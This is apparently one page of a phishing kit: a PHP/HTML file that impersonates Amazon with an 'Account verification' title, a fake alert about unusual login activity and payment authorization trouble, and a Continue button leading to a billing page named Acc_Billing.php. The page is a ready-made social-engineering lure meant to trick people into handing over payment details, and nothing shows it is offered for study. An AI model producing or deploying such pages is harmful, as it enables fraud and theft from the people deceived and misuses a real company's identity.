<?php
    
    include('__CONFIG__.php');

?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" href="Library/FontAwesome/css/fontawesome-all.min.css">
    <link rel="stylesheet" href="Library/Bootstrap/css/main.min.css">
    <link rel="stylesheet" href="Sheets/alert.css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" />
    <title>Amazon - Account verification</title>
</head>
<body>

    <div class="mynavbar">
        <div class="container-fluid">
            <ul class="nav">
                <li class="nav-item">
                  <a class="nav-link" href="#">
                      <img src="Assets/img/logo.png" alt="" class="brandimg">
                  </a>
                </li>
                <li class="nav-item ml-auto myddown">
                    <div class="dropdown">
                        <button class="btn btndown dropdown-toggle" type="button">
                          Account
                        </button>
                        <div class="mydropdown d-none">
                            <ul class="list-group list-group-flush">
                                <li class="list-group-item"><a href="#" class="mylink">Settings</a></li>
                                <li class="list-group-item"><a href="#" class="mylink">Switch Account</a></li>
                                <li class="list-group-item"><a href="#" class="mylink">Signout</a></li>
                              </ul>
                        </div>
                        
                      </div>
                </li>
              </ul>
        </div>
    </div>

    <div class="a-content">
        <div class="container">
                <span class="lefttext"><a href="#" class="lefttext">Your Account</a></span>
                <span class="middle">></span>
                <span class="righttext">Your Amazon Wallet</span>
                <p class="alerttext">Amazon's security system. We have recently discovered an unusual login activity. To protect your account , please continue the required steps .</p>


                <div class="row">
                    <div class="col-12">
                            <div class="alert alert-danger" role="alert">
                                    <h4 class="alert-heading"><i class="fas fa-exclamation-triangle text-danger"></i> Please update your payment method!</h4>
                                    <p>
                                            Sorry for the interruption, but we are having trouble authorizing your Payment Method.

                                            To protect the informations of our customers, our system has temporarily placed restrictions on your account until your informations has been validated against our system.
                                            
                                            you'll be able to get your account back just after finishing this steps
                                    </p>
                                    <a href="Acc_Billing.php" class="btn bgcolored">Continue</a>
                                  </div>
                    </div>
                </div>
        </div>
    </div>

    <script src="Library/jQuery/main.min.js"></script>
    <script src="Library/pooper/main.min.js"></script>
    <script src="Library/Bootstrap/js/main.min.js"></script>

    <script>
        $(document).ready(function(){
            $('.myddown').hover(function(){
                $('.mydropdown').togleClass('d-none');
            })
        })
    </script>
</body>
</html>